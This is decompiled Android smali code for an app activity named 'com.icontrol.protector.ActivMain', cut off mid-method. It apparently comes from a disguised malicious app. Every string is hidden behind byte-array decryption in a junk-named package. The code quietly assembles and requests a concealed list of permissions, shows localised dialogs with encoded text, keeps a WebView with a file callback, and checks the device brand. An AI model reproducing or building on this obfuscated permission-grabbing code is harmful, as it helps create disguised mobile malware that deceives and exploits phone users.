.class public Lcom/icontrol/protector/ActivMain;
.super Landroid/app/Activity;
.source "SourceFile"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/icontrol/protector/ActivMain$e;,
        Lcom/icontrol/protector/ActivMain$f;
    }
.end annotation


# static fields
.field public static f:Landroid/webkit/WebView;


# instance fields
.field private b:Landroid/webkit/ValueCallback;

.field private c:Landroid/view/View$OnClickListener;

.field private d:Landroid/view/View$OnClickListener;

.field e:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lcom/icontrol/protector/ActivMain$a;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/ActivMain$a;-><init>(Lcom/icontrol/protector/ActivMain;)V

    iput-object v0, p0, Lcom/icontrol/protector/ActivMain;->c:Landroid/view/View$OnClickListener;

    new-instance v0, Lcom/icontrol/protector/ActivMain$b;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/ActivMain$b;-><init>(Lcom/icontrol/protector/ActivMain;)V

    iput-object v0, p0, Lcom/icontrol/protector/ActivMain;->d:Landroid/view/View$OnClickListener;

    const/16 v0, 0x9

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/icontrol/protector/ActivMain;->e:Ljava/lang/String;

    return-void

    :array_0
    .array-data 1
        0x75t
        0x45t
        -0x63t
        -0x17t
        0x41t
        -0x15t
        -0x2bt
        -0x37t
        0x69t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x6t
        0x2et
        -0xct
        -0x79t
        0x6ft
        -0x7et
        -0x45t
        -0x51t
    .end array-data
.end method

.method public static synthetic a(Lcom/icontrol/protector/ActivMain;Landroid/content/DialogInterface;I)V
    .locals 0

    .line 1
    invoke-direct {p0, p1, p2}, Lcom/icontrol/protector/ActivMain;->j(Landroid/content/DialogInterface;I)V

    return-void
.end method

.method public static synthetic b(Lcom/icontrol/protector/ActivMain;Landroid/content/Context;)V
    .locals 0

    .line 1
    invoke-direct {p0, p1}, Lcom/icontrol/protector/ActivMain;->k(Landroid/content/Context;)V

    return-void
.end method

.method private c()V
    .locals 8

    .line 1
    const/4 v0, 0x2

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    new-array v1, v0, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/16 v1, 0x11

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    new-array v4, v2, [B

    fill-array-data v4, :array_5

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v5, 0xc31

    const/4 v6, 0x1

    const/4 v7, 0x3

    if-eq v4, v5, :cond_3

    const/16 v5, 0xca9

    if-eq v4, v5, :cond_2

    const/16 v5, 0xe7e

    if-eq v4, v5, :cond_1

    const/16 v5, 0xf2e

    if-eq v4, v5, :cond_0

    goto :goto_0

    :cond_0
    new-array v4, v0, [B

    fill-array-data v4, :array_6

    new-array v5, v2, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    move v3, v0

    goto :goto_1

    :cond_1
    new-array v4, v0, [B

    fill-array-data v4, :array_8

    new-array v5, v2, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    move v3, v7

    goto :goto_1

    :cond_2
    new-array v4, v0, [B

    fill-array-data v4, :array_a

    new-array v5, v2, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    const/4 v3, 0x0

    goto :goto_1

    :cond_3
    new-array v4, v0, [B

    fill-array-data v4, :array_c

    new-array v5, v2, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_4

    move v3, v6

    goto :goto_1

    :cond_4
    :goto_0
    const/4 v3, -0x1

    :goto_1
    const/16 v4, 0x2a

    if-eqz v3, :cond_8

    if-eq v3, v6, :cond_7

    if-eq v3, v0, :cond_6

    if-eq v3, v7, :cond_5

    new-array v0, v0, [B

    fill-array-data v0, :array_e

    new-array v3, v2, [B

    fill-array-data v3, :array_f

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v1, v1, [B

    fill-array-data v1, :array_10

    new-array v3, v2, [B

    fill-array-data v3, :array_11

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v4, [B

    fill-array-data v3, :array_12

    new-array v2, v2, [B

    fill-array-data v2, :array_13

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    goto/16 :goto_2

    :cond_5
    const/4 v0, 0x5

    new-array v0, v0, [B

    fill-array-data v0, :array_14

    new-array v1, v2, [B

    fill-array-data v1, :array_15

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x18

    new-array v1, v1, [B

    fill-array-data v1, :array_16

    new-array v3, v2, [B

    fill-array-data v3, :array_17

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x32

    new-array v3, v3, [B

    fill-array-data v3, :array_18

    new-array v2, v2, [B

    fill-array-data v2, :array_19

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    goto/16 :goto_2

    :cond_6
    const/4 v0, 0x6

    new-array v0, v0, [B

    fill-array-data v0, :array_1a

    new-array v1, v2, [B

    fill-array-data v1, :array_1b

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x12

    new-array v1, v1, [B

    fill-array-data v1, :array_1c

    new-array v3, v2, [B

    fill-array-data v3, :array_1d

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x21

    new-array v3, v3, [B

    fill-array-data v3, :array_1e

    new-array v2, v2, [B

    fill-array-data v2, :array_1f

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    goto :goto_2

    :cond_7
    const/16 v0, 0xa

    new-array v0, v0, [B

    fill-array-data v0, :array_20

    new-array v1, v2, [B

    fill-array-data v1, :array_21

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_22

    new-array v3, v2, [B

    fill-array-data v3, :array_23

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v3, 0x3d

    new-array v3, v3, [B

    fill-array-data v3, :array_24

    new-array v2, v2, [B

    fill-array-data v2, :array_25

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    goto :goto_2

    :cond_8
    new-array v0, v0, [B

    fill-array-data v0, :array_26

    new-array v3, v2, [B

    fill-array-data v3, :array_27

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    new-array v1, v1, [B

    fill-array-data v1, :array_28

    new-array v3, v2, [B

    fill-array-data v3, :array_29

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v3, v4, [B

    fill-array-data v3, :array_2a

    new-array v2, v2, [B

    fill-array-data v2, :array_2b

    invoke-static {v3, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    :goto_2
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v3

    invoke-virtual {p0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Landroid/content/pm/PackageManager;->getApplicationIcon(Ljava/lang/String;)Landroid/graphics/drawable/Drawable;

    move-result-object v3
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :catch_0
    const/4 v3, 0x0

    :goto_3
    new-instance v4, Landroid/app/AlertDialog$Builder;

    const v5, 0x10302d1

    invoke-direct {v4, p0, v5}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;I)V

    invoke-virtual {v4, v1}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    new-instance v2, Lntidisestablish/neumonoul/floccinaucinih/r1;

    invoke-direct {v2, p0}, Lntidisestablish/neumonoul/floccinaucinih/r1;-><init>(Lcom/icontrol/protector/ActivMain;)V

    invoke-virtual {v1, v0, v2}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v0

    if-eqz v3, :cond_9

    invoke-virtual {v0, v3}, Landroid/app/AlertDialog$Builder;->setIcon(Landroid/graphics/drawable/Drawable;)Landroid/app/AlertDialog$Builder;

    :cond_9
    invoke-virtual {v0}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    return-void

    :array_0
    .array-data 1
        0x10t
        0x16t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x5ft
        0x5dt
        0x7dt
        -0x2ft
        0x1dt
        0x44t
        -0x10t
        -0x17t
    .end array-data

    :array_2
    .array-data 1
        0x6et
        -0x23t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x21t
        -0x6at
        -0x5ct
        0x48t
        0x8t
        -0x71t
        0x33t
        0x19t
    .end array-data

    :array_4
    .array-data 1
        0x3bt
        -0x38t
        0x33t
        0x67t
        0x59t
        -0x54t
        0x3at
        -0x16t
        0x5et
        -0x3ft
        0x23t
        0x7ft
        0x5dt
        -0x45t
        0x21t
        -0x3t
        0x1at
    .end array-data

    nop

    :array_5
    .array-data 1
        0x7et
        -0x5bt
        0x46t
        0xbt
        0x38t
        -0x28t
        0x55t
        -0x68t
    .end array-data

    :array_6
    .array-data 1
        -0xat
        -0x50t
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x74t
        -0x28t
        0x34t
        -0x1ct
        0x38t
        0x7at
        -0x30t
        0x75t
    .end array-data

    :array_8
    .array-data 1
        -0x6bt
        0x5ct
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x1ft
        0x2et
        0x32t
        -0x46t
        0x3ct
        -0x31t
        0x73t
        -0x7et
    .end array-data

    :array_a
    .array-data 1
        -0x21t
        0x5et
    .end array-data

    nop

    :array_b
    .array-data 1
        -0x46t
        0x30t
        0x5t
        0x51t
        0x7ft
        -0x72t
        0x58t
        -0x50t
    .end array-data

    :array_c
    .array-data 1
        0x34t
        0x34t
    .end array-data

    nop

    :array_d
    .array-data 1
        0x55t
        0x46t
        0x19t
        0x19t
        -0x2dt
        0x51t
        0x21t
        0x7t
    .end array-data

    :array_e
    .array-data 1
        0x77t
        -0x45t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x38t
        -0x10t
        -0x6ft
        0x3dt
        -0x3ft
        0x7t
        0x6ft
        0x14t
    .end array-data

    :array_10
    .array-data 1
        0x5dt
        0x29t
        0x46t
        0x5dt
        0x25t
        -0x35t
        -0x73t
        -0x1dt
        0x38t
        0x20t
        0x56t
        0x45t
        0x21t
        -0x24t
        -0x6at
        -0xct
        0x7ct
    .end array-data

    nop

    :array_11
    .array-data 1
        0x18t
        0x44t
        0x33t
        0x31t
        0x44t
        -0x41t
        -0x1et
        -0x6ft
    .end array-data

    :array_12
    .array-data 1
        0x23t
        0x23t
        0x0t
        -0x5t
        0x4ft
        -0x2ft
        -0x9t
        0x28t
        0x77t
        0x2ft
        0x6t
        -0x13t
        0x1ct
        -0x70t
        -0x17t
        0x37t
        0x23t
        0x6bt
        0x1at
        -0x3t
        0x1ft
        -0x40t
        -0x18t
        0x2at
        0x23t
        0x6bt
        0xct
        -0x1bt
        0x1at
        -0x24t
        -0x1at
        0x2ct
        0x38t
        0x39t
        0x49t
        -0x14t
        0xat
        -0x3at
        -0x12t
        0x3bt
        0x32t
        0x38t
    .end array-data

    nop

    :array_13
    .array-data 1
        0x57t
        0x4bt
        0x69t
        -0x78t
        0x6ft
        -0x50t
        -0x79t
        0x58t
    .end array-data

    :array_14
    .array-data 1
        0x4t
        0x1et
        0x48t
        0x25t
        0x68t
    .end array-data

    nop

    :array_15
    .array-data 1
        0x50t
        0x7ft
        0x25t
        0x44t
        0x5t
        -0x4bt
        0x39t
        -0x5at
    .end array-data

    :array_16
    .array-data 1
        0x26t
        0x29t
        0x5t
        0x53t
        -0x52t
        0x47t
        0x17t
        0x52t
        0x59t
        -0x4t
        -0x41t
        -0x7ct
        0x4dt
        -0x66t
        0x15t
        -0xat
        0x21t
        0x2et
        0x10t
        0x59t
        0x3t
        -0x61t
        -0x43t
        0x20t
    .end array-data

    :array_17
    .array-data 1
        -0x1bt
        -0x61t
        0x7ct
        0x38t
        0x6dt
        -0x5t
        0x79t
        -0x6ft
    .end array-data

    :array_18
    .array-data 1
        0x1bt
        0x5ct
        -0x46t
        0x3dt
        0x69t
        0x33t
        -0x2ct
        -0x18t
        0x18t
        0x44t
        -0x5t
        0x68t
        -0x2dt
        -0x1et
        -0x28t
        -0x11t
        -0x46t
        -0x6bt
        -0xct
        -0x75t
        -0x54t
        0x37t
        0x62t
        0x38t
        0x59t
        0x48t
        -0x1dt
        0x2ft
        -0x2ct
        -0x1bt
        -0x2bt
        -0x18t
        0x18t
        0x5bt
        0x5et
        -0x7t
        0x30t
        0x30t
        -0x3ct
        -0x9t
        0xdt
        0x4ct
        -0xft
        0x24t
        0x75t
        0x39t
        -0x38t
        -0x3t
        0x16t
        0x5bt
    .end array-data

    nop

    :array_19
    .array-data 1
        0x79t
        0x29t
        -0x66t
        0x48t
        0x10t
        0x54t
        -0x5ft
        -0x7ct
    .end array-data

    :array_1a
    .array-data 1
        -0x65t
        -0x36t
        0x7et
        -0x6ft
        0x7et
        -0x2at
    .end array-data

    nop

    :array_1b
    .array-data 1
        0x7et
        0x6ft
        -0x3dt
        0x76t
        -0x1ct
        0x52t
        -0x47t
        -0x6ct
    .end array-data

    :array_1c
    .array-data 1
        -0x2at
        0x2et
        0x73t
        -0x5ft
        0x35t
        0x46t
        0x58t
        0x5dt
        -0x80t
        0x6bt
        0x5bt
        -0x1at
        0x66t
        0x46t
        0x22t
        0x30t
        -0x57t
        0x25t
    .end array-data

    nop

    :array_1d
    .array-data 1
        0x30t
        -0x73t
        -0xdt
        0x47t
        -0x80t
        -0x33t
        -0x43t
        -0x2bt
    .end array-data

    :array_1e
    .array-data 1
        -0x61t
        0x54t
        0x2ft
        -0x15t
        -0xct
        -0x37t
        0x77t
        0x57t
        -0x2ft
        0x1dt
        0x33t
        -0x7dt
        -0x58t
        -0x37t
        0x3ft
        0x25t
        -0xbt
        0x78t
        0x6dt
        -0x5at
        -0x11t
        -0x45t
        0x1bt
        0x5ct
        -0x64t
        0x60t
        0x23t
        -0x1at
        -0x20t
        -0x1dt
        0x75t
        0x67t
        -0x2t
    .end array-data

    nop

    :array_1f
    .array-data 1
        0x79t
        -0x7t
        -0x75t
        0xet
        0x4et
        0x5dt
        -0x70t
        -0x3dt
    .end array-data

    :array_20
    .array-data 1
        0x66t
        0x3ct
        0x16t
        -0x4t
        0x26t
        -0x47t
        0x2dt
        -0x80t
        0x66t
        0x3bt
    .end array-data

    nop

    :array_21
    .array-data 1
        -0x41t
        -0x47t
        -0x31t
        0x74t
        -0x2t
        0x1et
        -0xct
        0x1t
    .end array-data

    :array_22
    .array-data 1
        0x3ft
        0x7et
        0x29t
        -0x4dt
        -0x1t
        0x3at
        0x37t
        0x60t
        0x64t
        0xct
        0x5at
        -0x12t
        0x6bt
        0x3at
        0x37t
        0x60t
        0x66t
        -0xct
        0x29t
        -0x4dt
        0x7t
        0x4ft
        0x48t
        0x1et
        0x3et
        0x57t
        0x29t
        -0x44t
    .end array-data

    :array_23
    .array-data 1
        -0x19t
        -0x2ct
        -0x10t
        0x36t
        -0x21t
        -0x1et
        -0x70t
        -0x47t
    .end array-data

    :array_24
    .array-data 1
        -0x1bt
        0xet
        -0x19t
        0x3ct
        -0x49t
        -0x54t
        -0x60t
        -0x64t
        -0x65t
        0x50t
        -0x45t
        0x54t
        -0x3bt
        -0x2dt
        0x37t
        -0x64t
        -0x6ct
        0x50t
        -0x4bt
        0x55t
        -0x13t
        0x2bt
        0x59t
        -0x40t
        -0x1ct
        0x2et
        0x1ft
        0x55t
        -0x1bt
        -0x2dt
        0x2ft
        -0x64t
        -0x7bt
        0x50t
        -0x46t
        -0x54t
        -0x49t
        -0x58t
        0x58t
        -0x18t
        -0x1bt
        0xet
        -0x19t
        0x3et
        -0x49t
        -0x5et
        -0x60t
        -0x64t
        -0x65t
        0x50t
        -0x45t
        0x55t
        -0x16t
        -0x2dt
        0x2dt
        -0x64t
        -0x65t
        0x50t
        -0x44t
        0x55t
        -0x1bt
    .end array-data

    nop

    :array_25
    .array-data 1
        0x3ct
        -0x77t
        0x3ft
        -0x74t
        0x6ft
        0xbt
        -0x80t
        0x44t
    .end array-data

    :array_26
    .array-data 1
        0x68t
        0x36t
    .end array-data

    nop

    :array_27
    .array-data 1
        0x7t
        0x5dt
        -0x80t
        -0x68t
        0x67t
        0x6ft
        0xft
        -0x45t
    .end array-data

    :array_28
    .array-data 1
        -0x39t
        -0x25t
        -0x4at
        0x7ft
        0x28t
        -0x56t
        -0x69t
        -0x40t
        -0x5et
        -0x2et
        -0x5at
        0x67t
        0x2ct
        -0x43t
        -0x74t
        -0x29t
        -0x1at
    .end array-data

    nop

    :array_29
    .array-data 1
        -0x7et
        -0x4at
        -0x3dt
        0x13t
        0x49t
        -0x22t
        -0x8t
        -0x4et
    .end array-data

    :array_2a
    .array-data 1
        0x6t
        -0x15t
        -0x16t
        -0x49t
        -0x2at
        0x2at
        0x7t
        -0x4ft
        0x52t
        -0x19t
        -0x14t
        -0x5ft
        -0x7bt
        0x6bt
        0x19t
        -0x52t
        0x6t
        -0x5dt
        -0x10t
        -0x4ft
        -0x7at
        0x3bt
        0x18t
        -0x4dt
        0x6t
        -0x5dt
        -0x1at
        -0x57t
        -0x7dt
        0x27t
        0x16t
        -0x4bt
        0x1dt
        -0xft
        -0x5dt
        -0x60t
        -0x6dt
        0x3dt
        0x1et
        -0x5et
        0x17t
        -0x10t
    .end array-data

    nop

    :array_2b
    .array-data 1
        0x72t
        -0x7dt
        -0x7dt
        -0x3ct
        -0xat
        0x4bt
        0x77t
        -0x3ft
    .end array-data
.end method

.method public static d()[Ljava/lang/String;
    .locals 5

    .line 1
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    const/16 v1, 0x1b

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x1c

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v3, v2, [B

    fill-array-data v3, :array_3

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_4

    new-array v3, v2, [B

    fill-array-data v3, :array_5

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x24

    new-array v3, v1, [B

    fill-array-data v3, :array_6

    new-array v4, v2, [B

    fill-array-data v4, :array_7

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v3}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    new-array v1, v1, [B

    fill-array-data v1, :array_8

    new-array v3, v2, [B

    fill-array-data v3, :array_9

    invoke-static {v1, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/16 v1, 0x28

    new-array v1, v1, [B

    fill-array-data v1, :array_a

    new-array v2, v2, [B

    fill-array-data v2, :array_b

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-interface {v0, v1}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    const/4 v1, 0x0

    new-array v1, v1, [Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    return-object v0

    nop

    :array_0
    .array-data 1
        0x64t
        0x6at
        0x17t
        -0x3dt
        -0x4t
        0x22t
        0x4ct
        -0x6ct
        0x75t
        0x61t
        0x1t
        -0x24t
        -0x6t
        0x38t
        0x5bt
        -0x2dt
        0x6at
        0x6at
        0x5dt
        -0x8t
        -0x23t
        0x1ft
        0x6dt
        -0x18t
        0x4bt
        0x41t
        0x27t
    .end array-data

    :array_1
    .array-data 1
        0x5t
        0x4t
        0x73t
        -0x4ft
        -0x6dt
        0x4bt
        0x28t
        -0x46t
    .end array-data

    :array_2
    .array-data 1
        0xct
        0x2t
        0xet
        -0x38t
        0x16t
        0x5ft
        -0x9t
        -0x7at
        0x1dt
        0x9t
        0x18t
        -0x29t
        0x10t
        0x45t
        -0x20t
        -0x3ft
        0x2t
        0x2t
        0x44t
        -0x13t
        0x38t
        0x7dt
        -0x2at
        -0x9t
        0x21t
        0x23t
        0x29t
        -0xft
    .end array-data

    :array_3
    .array-data 1
        0x6dt
        0x6ct
        0x6at
        -0x46t
        0x79t
        0x36t
        -0x6dt
        -0x58t
    .end array-data

    :array_4
    .array-data 1
        -0x1t
        0x5dt
        -0x78t
        0x16t
        -0x7dt
        -0x43t
        -0x55t
        -0x4t
        -0x12t
        0x56t
        -0x62t
        0x9t
        -0x7bt
        -0x59t
        -0x44t
        -0x45t
        -0xft
        0x5dt
        -0x3et
        0x25t
        -0x51t
        -0x69t
        -0x76t
        -0x7ft
        -0x33t
        0x6ct
        -0x5et
        0x21t
        -0x48t
        -0x7dt
        -0x80t
        -0x80t
        -0x2bt
        0x6ct
        -0x41t
        0x30t
        -0x53t
        -0x80t
        -0x76t
    .end array-data

    :array_5
    .array-data 1
        -0x62t
        0x33t
        -0x14t
        0x64t
        -0x14t
        -0x2ct
        -0x31t
        -0x2et
    .end array-data

    :array_6
    .array-data 1
        0x7ct
        -0x19t
        -0x2ft
        -0x78t
        0x52t
        -0x1et
        0x64t
        0x62t
        0x6dt
        -0x14t
        -0x39t
        -0x69t
        0x54t
        -0x8t
        0x73t
        0x25t
        0x72t
        -0x19t
        -0x65t
        -0x45t
        0x7et
        -0x38t
        0x45t
        0x1ft
        0x4et
        -0x2at
        -0x1et
        -0x4dt
        0x7bt
        -0x3et
        0x5ft
        0x1ft
        0x49t
        -0x38t
        -0x1ft
        -0x41t
    .end array-data

    :array_7
    .array-data 1
        0x1dt
        -0x77t
        -0x4bt
        -0x6t
        0x3dt
        -0x75t
        0x0t
        0x4ct
    .end array-data

    :array_8
    .array-data 1
        0x1t
        0x32t
        -0x15t
        -0x65t
        -0x57t
        0x29t
        -0x7ct
        -0x36t
        0x10t
        0x39t
        -0x3t
        -0x7ct
        -0x51t
        0x33t
        -0x6dt
        -0x73t
        0xft
        0x32t
        -0x5ft
        -0x56t
        -0x72t
        0x1t
        -0x52t
        -0x5dt
        0x25t
        0x3t
        -0x28t
        -0x60t
        -0x80t
        0x9t
        -0x41t
        -0x49t
        0x34t
        0x1dt
        -0x25t
        -0x54t
    .end array-data

    :array_9
    .array-data 1
        0x60t
        0x5ct
        -0x71t
        -0x17t
        -0x3at
        0x40t
        -0x20t
        -0x1ct
    .end array-data

    :array_a
    .array-data 1
        0x8t
        0x3bt
        0x71t
        0x78t
        0x34t
        0x70t
        0xat
        -0x7bt
        0x19t
        0x30t
        0x67t
        0x67t
        0x32t
        0x6at
        0x1dt
        -0x3et
        0x6t
        0x3bt
        0x3bt
        0x47t
        0x14t
        0x5dt
        0x27t
        -0x13t
        0x30t
        0xat
        0x54t
        0x5ft
        0x1ft
        0x50t
        0x21t
        -0xct
        0x3at
        0x10t
        0x41t
        0x5et
        0x12t
        0x57t
        0x29t
        -0x8t
    .end array-data

    :array_b
    .array-data 1
        0x69t
        0x55t
        0x15t
        0xat
        0x5bt
        0x19t
        0x6et
        -0x55t
    .end array-data
.end method

.method static synthetic e(Lcom/icontrol/protector/ActivMain;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 1
    iget-object p0, p0, Lcom/icontrol/protector/ActivMain;->b:Landroid/webkit/ValueCallback;

    return-object p0
.end method

.method static synthetic f(Lcom/icontrol/protector/ActivMain;Landroid/webkit/ValueCallback;)Landroid/webkit/ValueCallback;
    .locals 0

    .line 1
    iput-object p1, p0, Lcom/icontrol/protector/ActivMain;->b:Landroid/webkit/ValueCallback;

    return-object p1
.end method

.method private g()V
    .locals 7

    .line 1
    invoke-static {}, Lcom/icontrol/protector/ActivMain;->d()[Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/util/ArrayList;

    invoke-direct {v1}, Ljava/util/ArrayList;-><init>()V

    array-length v2, v0

    const/4 v3, 0x0

    move v4, v3

    :goto_0
    if-ge v4, v2, :cond_1

    aget-object v5, v0, v4

    invoke-static {p0, v5}, Lntidisestablish/neumonoul/floccinaucinih/db;->a(Landroid/content/Context;Ljava/lang/String;)I

    move-result v6

    if-eqz v6, :cond_0

    invoke-interface {v1, v5}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    :cond_0
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    :cond_1
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_2

    new-array v0, v3, [Ljava/lang/String;

    invoke-interface {v1, v0}, Ljava/util/List;->toArray([Ljava/lang/Object;)[Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [Ljava/lang/String;

    const/16 v1, 0x16

    invoke-static {p0, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/v1;->h(Landroid/app/Activity;[Ljava/lang/String;I)V

    :cond_2
    return-void
.end method

.method private h()Z
    .locals 6

    .line 1
    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    const/4 v1, 0x7

    new-array v2, v1, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

